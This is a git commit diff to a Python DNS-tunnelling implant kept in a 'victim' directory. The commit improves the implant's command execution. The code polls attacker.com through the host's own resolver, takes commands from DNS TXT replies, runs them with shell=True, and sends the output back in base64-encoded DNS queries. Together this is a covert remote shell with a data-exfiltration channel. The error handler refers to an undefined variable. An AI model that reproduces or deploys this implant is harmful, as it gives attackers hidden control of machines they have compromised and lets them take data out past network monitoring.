055093150893b95b1129ada5293fc79f7db2a245
josiah <josiahd.kitchin@gmail.com>
2026-01-19 23:29:21 -0800

    improved shell commands

--- victim/dns_tunneler.py
+++ victim/dns_tunneler.py
@@ -9,6 +9,8 @@ import subprocess
 class TunnelMessageType(Enum): 
     PROBE = 1
     ACK = 2
+    FILE_START = 3
+    FILE_END = 4
 
 def print_status(s: str): 
     print(f"[*] {s}")
@@ -19,8 +21,16 @@ class Tunneler:
         self.resolver_ip_addr = resolver_ip_addr
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-    def tunnel(self, text: str) -> str | None: 
+    def tunnel_text(self, text: str) -> str: 
+        self.tunnel(TunnelMessageType.FILE_START.name)
+        response = self.tunnel(text)
+        self.tunnel(TunnelMessageType.FILE_END.name)
+        return response
+
+    def tunnel(self, text: str) -> str: 
         chunked_string = self._chunk_string(text)
+
+        output = ""
 
         for payload in chunked_string: 
             encoded = base64.urlsafe_b64encode(payload.encode()).decode().strip("=")
@@ -39,38 +49,50 @@ class Tunneler:
 
             for rr in reply.rr: 
                 if rr.rtype == dnslib.QTYPE.TXT: 
-                    return base64.urlsafe_b64decode(str(rr.rdata)).decode()
-            return None
+                    output += base64.urlsafe_b64decode(str(rr.rdata)).decode()
+        return output
         
 
     def _chunk_string(self, s: str): 
         return [s[i:i+30] for i in range(0, len(s), 30)]
 
-
 def main(): 
-    tunneler = Tunneler("attacker.com", "10.0.2.51")
+    resolver_ip = ""
+    with open("/etc/resolv.conf") as f: 
+        for line in f: 
+            if line.strip().startswith("nameserver"): 
+                resolver_ip = line.split()[1]
+
+    tunneler = Tunneler("attacker.com", resolver_ip)
     while True: 
-        time.sleep(3)
+        time.sleep(0.1)
 
         response = tunneler.tunnel(TunnelMessageType.PROBE.name)
-        if not response: 
-            continue
         print_status(response)
 
         if response == TunnelMessageType.ACK.name: 
             continue
         else: 
-            result = subprocess.run(
-                response.strip().split(" "),
-                capture_output=True,
-                text=True
-            )
-            if result.stdout: 
-                tunneler.tunnel(result.stdout)
-            if result.stderr: 
-                tunneler.tunnel(result.stderr)
-
+            try: 
+                result = subprocess.run(
+                    response,
+                    capture_output=True,
+                    text=True,
+                    shell=True
+                )
+                if result.stdout: 
+                    tunneler.tunnel_text(result.stdout)
+                if result.stderr: 
+                    tunneler.tunnel_text(result.stderr)
+            except Exception: 
+                tunneler.tunnel_text(f"Could not run command: {command}")
 
 if __name__ == "__main__": 
-    main()
+    try: 
+        main()
+    except KeyboardInterrupt: 
+        pass
+
+
+
 
